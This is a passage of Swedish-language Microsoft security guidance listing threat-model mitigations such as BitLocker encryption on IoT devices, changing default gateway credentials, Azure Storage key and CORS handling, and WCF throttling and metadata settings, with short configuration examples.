| **Steg** | Windows 10 IoT Core implementerar en lätt version av bit-locker Device Encryption, som har ett starkt beroende av närvaron av en TPM på plattformen, inklusive det nödvändiga preOS-protokollet i UEFI som utför nödvändiga mätningar. Dessa preOS-mätningar säkerställer att operativsystemet senare har en slutgiltig förteckning över hur operativsystemet lanserades. Kryptera OS-partitioner med hjälp av bit-locker och eventuella ytterligare partitioner även om de lagrar känsliga data. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Se till att endast de minsta tjänsterna/funktionerna är aktiverade på enheter

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL-fas**               | Distribution |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Aktivera eller stäng inte av några funktioner eller tjänster i operativsystemet som inte krävs för att lösningen ska fungera. Om enheten inte kräver att ett användargränssnitt ska distribueras installerar du Windows IoT Core i huvudlöst läge. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Kryptera OS och ytterligare partitioner av IoT Field Gateway med bit-locker

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-fältgateway | 
| **SDL-fas**               | Distribution |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Windows 10 IoT Core implementerar en lätt version av bit-locker Device Encryption, som har ett starkt beroende av närvaron av en TPM på plattformen, inklusive det nödvändiga preOS-protokollet i UEFI som utför nödvändiga mätningar. Dessa preOS-mätningar säkerställer att operativsystemet senare har en slutgiltig förteckning över hur operativsystemet lanserades. Kryptera OS-partitioner med hjälp av bit-locker och eventuella ytterligare partitioner även om de lagrar känsliga data. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Kontrollera att standardinloggningsuppgifterna för fältgatewayen ändras under installationen

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-fältgateway | 
| **SDL-fas**               | Distribution |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Kontrollera att standardinloggningsuppgifterna för fältgatewayen ändras under installationen |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Se till att Cloud Gateway implementerar en process för att hålla den anslutna programvaran uppdaterad

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT Cloud Gateway | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Gateway val - Azure IoT Hub |
| **Referenser**              | [Översikt över hantering av IoT Hub Device](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [Så här uppdaterar du inbyggd programvara för enhet](../../iot-hub/tutorial-firmware-update.md) |
| **Steg** | LWM2M är ett protokoll från Open Mobile Alliance för IoT Device Management. Azure IoT-enhetshantering gör det möjligt att interagera med fysiska enheter med hjälp av enhetsjobb. Se till att Cloud Gateway implementerar en process för att rutinmässigt hålla enheten och andra konfigurationsdata uppdaterade med Azure IoT Hub Device Management. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Kontrollera att enheter har säkerhetskontroller för slutpunkt som har konfigurerats enligt organisationsprinciper

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Gräns för datorförtroende | 
| **SDL-fas**               | Distribution |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Kontrollera att enheter har slutpunktssäkerhetskontroller som bit-locker för kryptering på disknivå, anti-virus med uppdaterade signaturer, värdbaserad brandvägg, OS-uppgraderingar, gruppprinciper etc. konfigureras enligt organisationens säkerhetsprinciper. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Säkerställ säker hantering av Azure-lagringsåtkomstnycklar

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Azure Storage | 
| **SDL-fas**               | Distribution |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Azure Storage-säkerhetsguide – hantera dina lagringskontonycklar](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Steg** | <p>Nyckellagring: Det rekommenderas att lagra Azure Storage-åtkomstnycklarna i Azure Key Vault som en hemlighet och låta programmen hämta nyckeln från nyckelvalvet. Detta rekommenderas på grund av följande orsaker:</p><ul><li>Ansökan kommer aldrig att ha lagringsnyckeln hårdkodad i en konfigurationsfil, som tar bort den avenyn för någon att få tillgång till nycklarna utan särskilt tillstånd</li><li>Åtkomst till nycklarna kan styras med Hjälp av Azure Active Directory. Det innebär att en kontoägare kan bevilja åtkomst till den handfull program som behöver hämta nycklarna från Azure Key Vault. Andra program kommer inte att kunna komma åt nycklarna utan att ge dem tillstånd specifikt</li><li>Nyckelförnyelse: Det rekommenderas att ha en process på plats för att återskapa Azure-lagringsåtkomstnycklar av säkerhetsskäl. Information om varför och hur du planerar för nyckelförnyelse dokumenteras i referensartikeln för Azure Storage Security Guide</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Kontrollera att endast betrodda ursprung tillåts om CORS är aktiverat på Azure-lagring

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Azure Storage | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [CORS-stöd för Azure Storage-tjänsterna](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Steg** | Med Azure Storage kan du aktivera CORS – Cross Origin Resource Sharing. För varje lagringskonto kan du ange domäner som kan komma åt resurserna i det lagringskontot. Som standard är CORS inaktiverat på alla tjänster. Du kan aktivera CORS genom att använda REST API eller lagringsklientbiblioteket för att anropa en av metoderna för att ange tjänstprinciper. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Aktivera WCF:s funktion för strypning av tjänster

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | WCF | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | .NET-ramverk 3 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kungariket](https://vulncat.fortify.com) |
| **Steg** | <p>Att inte begränsa användningen av systemresurser kan leda till resursutmattning och i slutändan en överbelastning.</p><ul><li>**FÖRKLARING:** Windows Communication Foundation (WCF) erbjuder möjligheten att begränsa servicebegäranden. Om du tillåter för många klientbegäranden kan det översvämma ett system och förbruka sina resurser. Å andra sidan kan endast ett litet antal förfrågningar till en tjänst hindra legitima användare från att använda tjänsten. Varje tjänst bör justeras individuellt och konfigureras så att lämplig mängd resurser tillåts.</li><li>**REKOMMENDATIONER** Aktivera WCF:s funktion för servicebegränsning och ange vilka gränser som är lämpliga för ditt program.</li></ul>|

### <a name="example"></a>Exempel
Följande är en exempelkonfiguration med begränsning aktiverad:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>WCF-Information utlämnande via metadata

| Titel                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | WCF | 
| **SDL-fas**               | Utveckla |  
| **Tillämplig teknik** | .NET-ramverk 3 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kungariket](https://vulncat.fortify.com) |
| **Steg** | Metadata kan hjälpa angripare att lära sig om systemet och planera en form av attack. WCF-tjänster kan konfigureras för att exponera metadata. Metadata ger detaljerad information om tjänstbeskrivningar och bör inte sändas i produktionsmiljöer. `HttpGetEnabled`  /  Egenskaperna `HttpsGetEnabled` för klassen ServiceMetaData definierar om en tjänst ska exponera metadata | 

### <a name="example"></a>Exempel
Koden nedan instruerar WCF att sända en tjänsts metadata
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Broadcast inte tjänstmetadata i en produktionsmiljö. Ange egenskaperna HttpGetEnabled / HttpsGetEnabled för klassen ServiceMetaData till false. 

### <a name="example"></a>Exempel
Koden nedan instruerar WCF att inte sända en tjänsts metadata. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
